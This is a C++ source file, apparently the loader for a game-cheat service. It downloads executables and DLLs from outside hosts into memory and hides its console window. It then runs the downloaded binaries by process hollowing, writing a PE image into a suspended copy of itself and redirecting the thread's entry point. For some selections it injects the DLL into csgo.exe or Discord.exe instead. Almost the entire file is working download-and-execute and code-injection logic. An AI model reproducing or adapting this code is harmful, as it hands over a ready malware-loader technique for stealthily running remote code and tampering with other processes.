#include <iostream>
#include <Windows.h>
#include <fstream>

#include "cWinsock.h"
#include "Injection.h"
#include "XOR.h"

#define CURL_STATICLIB

#include "curl.h"
#pragma comment (lib, "Normaliz.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Wldap32.lib")
#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib, "advapi32.lib")

struct MemoryStruct 
{
	char* memory;
	size_t size;
};

int RunPortableExecutableLegacy(void* Image)
{
	IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
	IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;

	CONTEXT* CTX;

	DWORD* ImageBase; //Base address of the image
	void* pImageBase; // Pointer to the image base

	int count;
	char CurrentFilePath[1024];

	DOSHeader = PIMAGE_DOS_HEADER(Image); // Initialize Variable
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew); // Initialize

	GetModuleFileNameA(0, CurrentFilePath, 1024); // path to current executable

	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
	{
		ZeroMemory(&PI, sizeof(PI)); // Null the memory
		ZeroMemory(&SI, sizeof(SI)); // Null the memory

		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
			CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) // Create a new instance of current
			//process in suspended state, for the new image.
		{
			// Allocate memory for the context.
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
			{
				// Read instructions
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);

				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				// Write the image to the process
				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
				{
					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
				}
				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);

				// Move address of entry point to the eax register
				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
				ResumeThread(PI.hThread); //´Start the process/call main()

				return 0; // Operation was successful.
			}
		}
	}
}

int RunPortableExecutable(void* Image)
{
	IMAGE_DOS_HEADER* DOSHeader;
	IMAGE_NT_HEADERS* NtHeader;
	IMAGE_SECTION_HEADER* SectionHeader;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	CONTEXT* CTX;
	DWORD* ImageBase = NULL;
	void* pImageBase = NULL;
	int count;
	char CurrentFilePath[1024];
	DOSHeader = PIMAGE_DOS_HEADER(Image);
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);
	GetModuleFileNameA(0, CurrentFilePath, 1024);
	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) {
		ZeroMemory(&PI, sizeof(PI));
		ZeroMemory(&SI, sizeof(SI));
		bool threadcreated = CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI);
		if (threadcreated == true) {
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL;
			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);

				pImageBase = VirtualAllocEx(PI.hProcess, NULL, NtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				if (pImageBase == 0x00000000) {
					ResumeThread(PI.hThread);
					ExitProcess(NULL);
					return 1;
				}
				if (pImageBase > 0) {
					WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
					for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++) {
						SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
						WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
							LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
					}
					WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&pImageBase), 4, 0);
					CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
					SetThreadContext(PI.hThread, LPCONTEXT(CTX));
					ResumeThread(PI.hThread);
					CloseHandle(PI.hThread);
					CloseHandle(PI.hProcess);
					return 0;
				}
			}
		}
	}
}

static size_t
WriteMemoryCallback(void* contents, size_t size, size_t nmemb, void* userp)
{
	size_t realsize = size * nmemb;
	struct MemoryStruct* mem = (struct MemoryStruct*)userp;

	char* ptr = (char*)realloc(mem->memory, mem->size + realsize + 1);
	if (ptr == NULL) {
		/* out of memory! */
		printf("not enough memory (realloc returned NULL)\n");
		return 0;
	}

	mem->memory = ptr;
	memcpy(&(mem->memory[mem->size]), contents, realsize);
	mem->size += realsize;
	mem->memory[mem->size] = 0;

	return realsize;
}


void cWinSock::downloadBinary(int cSelection)
{
	curl_global_init(CURL_GLOBAL_ALL);
	CURL* curl = curl_easy_init();
	std::string url;
	CURLcode res;
	//std::string userAgent = ("T4xdSQyjkSd4d9V9Jycs");
	int idx = uAgentFromServer.find("\n");
	std::string userAgent = uAgentFromServer.erase(idx);

	bool hideConsole = true;

	if (cSelection == 1)
	{
		url = "https://voidrealm.xyz/forum/binaries/csgo/VoidRealm.exe";
	}
	else if (cSelection == 2)
	{
		url = "https://voidrealm.xyz/forum/binaries/csgo/VoidRealmb.exe";
	}
	else if (cSelection == 3)
	{
		url = "https://voidrealm.xyz/forum/binaries/csgos/VoidRealm.exe";
	}
	else if (cSelection == 4)
	{
		url = "http://macky.xyz/VoidRealm.dll";
	}
	else if (cSelection == 5)
	{
		url = "https://voidrealm.xyz/forum/binaries/tf2/VoidRealm.exe";
	}
	else if (cSelection == 6)
	{
		url = "https://cdn.discordapp.com/attachments/582700094428545034/876973363552219167/Rust.dll";
	}
	else
	{
		curl_easy_cleanup(curl);
		curl_global_cleanup();
		return;
	}

	struct MemoryStruct chunk;
	chunk.memory = (char*)malloc(1);  // will be grown as needed by the realloc above 
	chunk.size = 0; //    no data at this point 

	curl_easy_setopt(curl, CURLOPT_URL, url);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&chunk);
	curl_easy_setopt(curl, CURLOPT_USERAGENT, userAgent);
	res = curl_easy_perform(curl);

	// check for errors 
	if (res != CURLE_OK) 
	{
		fprintf(stderr, "Download Failed Code: %s\n",
			curl_easy_strerror(res));
	}
	else 
	{
		if (hideConsole)
		{
			ShowWindow(GetConsoleWindow(), SW_HIDE);
		}
		else
		{
			system("cls");
		}

		if (cSelection == 1 || cSelection == 2 || cSelection == 3)
		{
			system("start steam://rungameid/730//-windowed -noborder/");
		}
		else if (cSelection == 5)
		{
			system("start steam://rungameid/440//-windowed -noborder/");
		}
		
		if (cSelection == 4)
		{
			system("start steam://rungameid/730");
			Inject(chunk.memory, chunk.size, "csgo.exe");
		}
		else if (cSelection == 6)
		{
			Inject(chunk.memory, chunk.size, "Discord.exe");
		}
		else
		{
			RunPortableExecutable(chunk.memory);
		}
	}

	// cleanup curl stuff 
	curl_easy_cleanup(curl);
	free(chunk.memory);

	curl_global_cleanup();
}